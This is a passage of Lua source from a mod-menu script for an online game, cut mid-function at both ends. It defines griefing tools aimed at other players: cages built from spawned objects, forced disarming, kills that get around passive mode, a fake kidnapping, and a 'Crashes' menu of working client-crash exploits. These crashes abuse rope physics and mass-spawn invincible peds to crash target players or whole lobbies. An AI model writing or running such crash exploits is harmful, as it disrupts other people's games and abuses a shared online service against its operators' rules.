        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
        util.yield(100)
    end)

    menu.toggle_loop(windmilli, "Windmills V2", {"togglemillsv1"}, "", function(on_toggle)
        Fewd.BlockSyncs(player_id, function()
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
                entities.delete_by_handle(object)
                util.yield(1000)
            end)
        end)

    menu.action(windmilli, "Delete Objects", {"clearwindmills"}, "", function()
        menu.trigger_commands("clearobj")
    end)

    local cage = menu.list(trolling, "Cage Player", {}, "")

    menu.action(cage, "Shiped", {"ship"}, "", function(cl)
        local number_of_cages = 12
        local elec_box = util.joaat("prop_contr_03b_ld")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.75
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(8)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, angle, 2, 0)
                obj_pos.z += 1.8
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)

    menu.action(cage, "Electric Cage", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)

	menu.action(cage, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
		local hash = 4022605402
		request_model(hash)
		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
        spawned_objects[#spawned_objects + 1] = cage_object
		util.yield(15)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)
	
    menu.action(cage, "Pet Cage", {"doghousecage"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = -1782242710
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		    util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
        spawned_objects[#spawned_objects + 1] = cage_object
	    util.yield(15)
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)
	
    menu.action(cage, "Christmas Time", {"jollycage"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = 238789712
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		    util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
        spawned_objects[#spawned_objects + 1] = cage_object
	    util.yield(0015)
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)
	
    menu.action(cage, "Christmas Time v2", {"jollycage2"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = util.joaat("ch_prop_tree_02a")
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
	    	util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
      spawned_objects[#spawned_objects + 1] = cage_object
      spawned_objects[#spawned_objects + 1] = cage_object2
      spawned_objects[#spawned_objects + 1] = cage_object3
      spawned_objects[#spawned_objects + 1] = cage_object4
      spawned_objects[#spawned_objects + 1] = cage_object5
	    util.yield(15)
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
     menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(cage, "Christmas Time v3", {"jollycage3"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = util.joaat("ch_prop_tree_03a")
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
	    	util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
        spawned_objects[#spawned_objects + 1] = cage_object
        spawned_objects[#spawned_objects + 1] = cage_object2
        spawned_objects[#spawned_objects + 1] = cage_object3
        spawned_objects[#spawned_objects + 1] = cage_object4
        spawned_objects[#spawned_objects + 1] = cage_object5
	    util.yield()
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(cage, "'Safe' Space", {"safecage"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = 1089807209
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
	    	util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
        spawned_objects[#spawned_objects + 1] = cage_object
       spawned_objects[#spawned_objects + 1] = cage_object2
       spawned_objects[#spawned_objects + 1] = cage_object3
       spawned_objects[#spawned_objects + 1] = cage_object4
       spawned_objects[#spawned_objects + 1] = cage_object5
    	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
    	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
    	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
    	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	    ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	    util.yield(15)
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
       menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(cage, "Trash", {"trashcage"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = 684586828
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		    util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
        spawned_objects[#spawned_objects + 1] = cage_object
        spawned_objects[#spawned_objects + 1] = cage_object2
        spawned_objects[#spawned_objects + 1] = cage_object3
	    util.yield(15)
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(cage, "Money Cage", {"moneycage"}, "", function()
	    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
	    local hash = util.joaat("bkr_prop_moneypack_03a")
	    request_model(hash)
	    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		    util.yield()
	    end
	    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	    local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	    local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	    local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	    local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	    local cage_object6 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	    local cage_object7 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	    local cage_object8 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	    local cage_object9 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above

        spawned_objects[#spawned_objects + 1] = cage_object
        spawned_objects[#spawned_objects + 1] = cage_object2
        spawned_objects[#spawned_objects + 1] = cage_object3
        spawned_objects[#spawned_objects + 1] = cage_object4
        spawned_objects[#spawned_objects + 1] = cage_object5
        spawned_objects[#spawned_objects + 1] = cage_object6
        spawned_objects[#spawned_objects + 1] = cage_object7
        spawned_objects[#spawned_objects + 1] = cage_object8
        spawned_objects[#spawned_objects + 1] = cage_object9
	    util.yield(15)
	    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	    rot.y = 90
	    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
    end)

	menu.action(cage, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
		request_model(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
        spawned_objects[#spawned_objects + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
        menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)
    
    menu.action(cage, "Queen Isabell's Cage", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "Cargo Container", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(trolling, "Delete Cages", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("Deleted " .. entitycount .. " Cages")
    end)

    menu.divider(trolling, "Others")

    menu.action(trolling, "Passive Mode Kill", {}, "(DOESN'T WORK ON NO RAGDOLL PLAYERS) Tries To Kill The Player in Passive Mode", function ()
        passive_mode_kill(player_id)
    end)

    menu.action(trolling,"Kidnap Player", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)


        end
	end)

    menu.action(trolling, "Killing Indoors", {}, "Does not work in apartments (Love u jinx x2)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
    
        for i, interior in ipairs(interior_stuff) do
            if Fewd.is_player_in_interior(player_id) == interior then
                util.toast("Player Not In Interior. D:")
            return end
            if Fewd.is_player_in_interior(player_id) ~= interior then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    local useforce = {
        184361638,
        1890640474,
        868868440,
    }

local crash_ents = {}
   local BrokenScenarioPeds = {
       "s_m_y_construct_01",
       "s_m_y_construct_02",
       "csb_janitor",
       "ig_russiandrunk",
       "s_m_m_gardener_01",
       "s_m_y_winclean_01",
       "a_f_m_bodybuild_01",
       "s_m_m_cntrybar_01",
       "s_m_y_chef_01",
       "ig_abigail",
   }
   local BrokenScenarios = {
       "WORLD_HUMAN_CONST_DRILL",
       "WORLD_HUMAN_HAMMERING",
       "WORLD_HUMAN_JANITOR",
       "WORLD_HUMAN_DRINKING",
       "WORLD_HUMAN_GARDENER_PLAN",
       "WORLD_HUMAN_MAID_CLEAN",
       "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS",
       "WORLD_HUMAN_STAND_FISHING",
       "PROP_HUMAN_BBQ",
       "WORLD_HUMAN_WELDING",
   }
   local BrokenScenariosProps = {
       "prop_tool_jackham",
       "prop_tool_hammer",
       "prop_tool_broom",
       "prop_amb_40oz_02",
       "prop_cs_trowel",
       "prop_rag_01",
       "prop_curl_bar_01",
       "prop_fishing_rod_01",
       "prop_fish_slice_01",
       "prop_weld_torch",
       "p_amb_coffeecup_01",
   }


crashes = menu.list(malicious, "Crashes", {}, "Crashes")

menu.divider(crashes, "FewMod Lobby Crashes")

menu.action(crashes, "FewMod All In One", {"FewModLobbyCrash"}, "Uses Multiple Crashes In The Menu \nNote: Going Through All Them All Takes A Bit Of Time", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    util.toast("If You Get Any Error Try Not To Worry About It")
    util.log("If You Get Any Error Try Not To Worry About It")
    menu.trigger_commands("XCCrash".. PLAYER.GET_PLAYER_NAME())
    util.toast("Done Clone Crash")
    util.log("Done Clone Crash")
    menu.trigger_commands("mathcrashx3" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.toast("Done Math Crash")
    util.log("Done Math Crash")
    util.yield(6000)
    menu.trigger_commands("CarCrashv3" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(6000)
    util.toast("Done Car Crash")
    util.log("Done Car Crash")
    menu.trigger_commands("JesusCrashv1" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(8000)
    util.toast("Done Jesus Crash")
    util.log("Done Jesus Crash")
    menu.trigger_commands("BigChunxusCrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(20000)
    util.toast("Done Big Chunxus Crash")
    util.log("Done Big Chunxus Crash")
    menu.trigger_commands("clearworld")
    menu.trigger_commands("weededcrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.toast("Done Weed Crash")
    util.log("Done Weed Crash")
    menu.trigger_commands("Yachtyv4" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(7000)
    util.toast("Done Yacht Crash v4")
    util.log("Done Yacht Crash v4")
    menu.trigger_commands("Yachtyv5" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(7000)
    util.toast("Done Yacht Crash v5")
    util.log("Done Yacht Crash v5")
    menu.trigger_commands("musclecrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(10000)
    util.toast("Done Muscle Crash")
    util.log("Done Muscle Crash")
    menu.trigger_commands("musclecrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    menu.trigger_commands("componentcrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.toast("Started Component Crash (This Crash Takes A Bit)")
    util.log("Started Component Crash (This Crash Takes A Bit)")
    util.yield(95000)
    util.log("Done Component Crash")
    menu.trigger_commands("clearworld")
    menu.trigger_commands("michaeltaxicrash" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(20000)
    util.toast("Done Michael Taxi Crash")
    util.log("Done Michael Taxi Crash")
    menu.trigger_commands("crashv77" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(15000)
    util.toast("Done Sync Crash v1")
    util.log("Done Sync Crash v1")
    menu.trigger_commands("crashv77" .. PLAYER.GET_PLAYER_NAME(player_id))
    menu.trigger_commands("crashv78" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(15000)
    util.toast("Done Sync Crash v2")
    util.log("Done Sync Crash v2")
    menu.trigger_commands("crashv78" .. PLAYER.GET_PLAYER_NAME(player_id))
    menu.trigger_commands("crashv79" .. PLAYER.GET_PLAYER_NAME(player_id))
    util.yield(10000)
    util.toast("Done Sync Crash v3")
    util.log("Done Sync Crash v3")
    menu.trigger_commands("crashv79" .. PLAYER.GET_PLAYER_NAME(player_id))
    menu.trigger_commands("anticrashcamera".. " on")
    menu.trigger_commands("5GCrashForSession")
    util.yield(10000)
    util.toast("Done 5G Crash")
    util.log("Done 5G Crash")
    menu.trigger_commands("AIOCrashForSession")
    util.yield(10000)
    util.toast("Done AIO Crash")
    util.log("Done AIO Crash")
    menu.trigger_commands("anticrashcamera".. " off")
    menu.trigger_commands("FewModParachute")
    util.yield(95000)
    util.toast("Done FewMod Parachute Crash")
    util.log("Done FewMod Parachute Crash")
    menu.trigger_commands("clearworld")
    menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME())
    util.toast("Done Steamroller Crash")
    util.log("Done Steamroller Crash")
    util.yield(1000)
    util.toast("All Crashes Completed")
    util.log("All Crashes Completed")
    menu.trigger_commands("anticrashcamera".. " off")
    menu.trigger_commands("clearworld")
    menu.trigger_commands("deleteropes")
end)

menu.divider(crashes, "Lobby Math Crashes")

menu.action(crashes, "Math Crash x3 Lobby", {"mathcrashx3"}, "One of the versions of rope crash.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local ppos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)

    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    util.yield(100)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
    util.yield(100)

    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
end)

menu.divider(crashes, "Component Crashes")

            menu.action(crashes, "Component Crash", {"componentcrash"}, "You Will Be In Anti-Crash Camera For A While", function()
                    if player_id ~= players.user() then
                        local math_random = math.random
                        local joaat = util.joaat
                        util.yield(100)
                        local pedhash = util.joaat("P_franklin_02")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds1 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            if pedt == 1 then
                                pedtype = 0
                            else
                                pedtype = 3
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, true)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
